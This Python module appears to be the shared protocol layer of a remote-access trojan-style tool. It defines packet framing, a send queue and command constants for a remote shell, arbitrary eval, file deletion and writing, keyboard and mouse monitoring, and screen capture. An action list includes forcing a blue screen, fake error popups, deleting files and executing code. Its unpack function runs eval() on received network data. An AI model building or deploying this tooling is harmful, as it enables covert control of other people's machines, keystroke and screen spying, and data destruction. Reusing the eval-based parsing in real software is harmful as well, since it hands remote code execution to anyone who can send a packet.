import socket
from threading import Lock, Thread
from time import perf_counter, sleep
from copy import copy
from typing import Any, Dict


Packet = Dict[str, Any]
WIDE_WIDTH = 1024 * 1024 * 1024 * 10


def pack(datas: Packet):
    datas = str(datas).encode("utf-8")
    length = len(datas).to_bytes(8, "big", signed=False)
    return length + datas


def unpack(data: bytes):
    data: dict = eval(data.decode("utf-8"))
    return data


def start_and_return(func, args=(), name: str = None):
    thread = Thread(target=func, args=args, daemon=True, name=name)
    thread.start()
    return thread


def ms(start: float, end: float = None):
    if end is None:
        end = perf_counter()
    return round((end - start) * 1000, 2)


def packet_str(packet: Packet):
    new_packet = {}
    for name, value in packet.items():
        if isinstance(value, str) and len(value) > 30:
            value = value[:12] + "..." + value[-12:]
        new_packet[name] = value
    return str(new_packet)


class ScreenFormat:
    PNG = "png"
    JPEG = "jpeg"
    RAW = "raw"


class Priority:
    HIGHEST = 0
    HIGH = 1
    HIGHER = 2
    NORMAL = 3
    LOWER = 4
    LOW = 5
    priorities = [HIGHEST, HIGH, HIGHER, NORMAL, LOWER, LOW]


class Actions:
    class Action(str):
        def __init__(self, name: str, label: str):
            self.label = label

        def __new__(cls, value, *args, **kwargs):
            return str.__new__(cls, value)

    BLUE_SCREEN = Action("blue_screen", "蓝屏")
    RECORD_SCREEN = Action("record_screen", "记录屏幕")
    DELETE_FILE = Action("delete_file", "删除文件")
    POPUP_ERROR_WINDOW = Action("popup_error_window", "弹出错误窗口")
    RETURN_DESKTOP = Action("return_desktop", "返回桌面")
    CLOSE_WINDOW = Action("close_window", "关闭窗口")
    EXECUTE_COMMAND = Action("execute_command", "执行命令")
    EXECUTE_CODE = Action("execute_code", "执行代码")
    action_list = [
        BLUE_SCREEN,
        RECORD_SCREEN,
        DELETE_FILE,
        POPUP_ERROR_WINDOW,
        RETURN_DESKTOP,
        CLOSE_WINDOW,
        EXECUTE_COMMAND,
        EXECUTE_CODE,
    ]
    action_map = {action.label: action for action in action_list}


class PacketManager:
    def __init__(self, connected: bool, sock: socket.socket = None):
        # noinspection PyTypeChecker
        self.sock: socket.socket = sock
        self.stack_lock = Lock()
        self.packet_stack = {priority: [] for priority in Priority.priorities}
        self.next_loss = False
        self.connected = connected

    def init_stack(self):
        self.packet_stack = {priority: [] for priority in Priority.priorities}

    def set_socket(self, sock: socket.socket):
        self.sock = sock

    def packet_send_thread(self):
        while self.connected:
            # 取包
            with self.stack_lock:
                for priority in Priority.priorities:
                    try:
                        packet, loss_enable = self.packet_stack[priority].pop(0)
                        break
                    except IndexError:
                        continue
                else:
                    self.next_loss = False
                    sleep(0.0001)
                    continue
            if loss_enable and self.next_loss:
                continue
            # print("发送数据包:", packet["type"])

            # 发包
            length = len(packet)
            timer = perf_counter()
            all_sent = 0
            while True:
                data = packet[: min(length, 1024 * 1024 * 1024)]
                try:
                    send_length = self.sock.send(data)
                except ConnectionError:
                    self.connected = False
                    return
                except TimeoutError:
                    print("缓冲区已满! 对方疑似停止接收数据")
                    continue
                if send_length < len(data):
                    print("宽带已满")
                    self.next_loss = True
                packet = packet[send_length:]
                length -= send_length
                all_sent += send_length
                if (perf_counter() - timer) * WIDE_WIDTH < all_sent:
                    sleep(all_sent / (WIDE_WIDTH * (perf_counter() - timer)))
                if length <= 0:
                    break

    def send_packet(
        self, packet: Packet, loss_enable: bool = False, priority: int = Priority.HIGHER
    ) -> None:
        packet_data = pack(packet)
        self.packet_stack[priority].append((packet_data, loss_enable))
        return len(packet_data), packet_data

    def recv_length(self, length) -> bytes:
        data = b""
        while True:
            data_part = self.sock.recv(length)
            length -= len(data_part)
            data += data_part
            if length <= 0:
                break
        return data

    def recv_packet(self) -> tuple[int, None] | tuple[int, Packet]:
        try:
            length = self.recv_length(8)
            length = int.from_bytes(length, "big")
            packet = self.recv_length(length)
        except TimeoutError:
            return 0, None
        return length, unpack(packet)


# From Server
SET_MOUSE_BUTTON = "set_mouse_button"
SET_MOUSE_SCROLL = "set_mouse_scroll"
GET_MOUSE_POS = "get_mouse_pos"
GET_KEYBOARD_STATE = "get_keyboard_state"
SET_MOUSE_POS = "set_mouse_pos"
SET_KEYBOARD_KEY = "set_keyboard_key"
GET_SCREEN = "get_screen"
SET_SCREEN_SEND = "set_screen_send"
SET_SCREEN_FPS = "set_screen_fps"
SET_SCREEN_FORMAT = "set_screen_format"
SET_SCREEN_QUALITY = "set_screen_quality"
SET_SCREEN_SIZE = "set_screen_size"
SET_PRE_SCALE = "set_pre_scale"
OPEN_ERROR_WINDOW = "open_error_window"
FILE_VIEW = "file_view"
FILE_CREATE = "file_create"
FILE_DELETE = "file_delete"
FILE_WRITE = "file_write"
REQ_LIST_DIR = "req_list_dir"
SHELL_INIT = "shell_init"
SHELL_INPUT = "shell_input"
STATE_INFO = "state_info"
ACTION_INFO = "action_info"
ACTION_ADD = "action_add"
ACTION_DEL = "action_del"
ACTION_UPDATE = "action_update"
PING = "ping"
EVAL = "eval"
CLIENT_RESTART = "client_restart"
CHANGE_ADDRESS = "change_address"
CHANGE_CONFIG = "change_config"
REQ_CONFIG = "req_config"

# From Client
LOG = "log"
SCREEN = "screen"
KEY_EVENT = "key_event"
MOUSE_EVENT = "mouse_event"
SHELL_OUTPUT = "shell_output"
SHELL_BROKEN = "shell_broken"
EVAL_RESULT = "eval_result"
HOST_NAME = "host_name"
SCREEN_RAW_SIZE = "screen_raw_size"
DIR_LIST_RESULT = "dir_list_result"
FILE_VIEW_CREATE = "file_view_create"
FILE_VIEW_DATA = "file_view_data"
FILE_VIEW_OVER = "file_view_over"
FILE_VIEW_ERROR = "file_view_error"
CONFIG_RESULT = "config_result"
PONG = "pong"
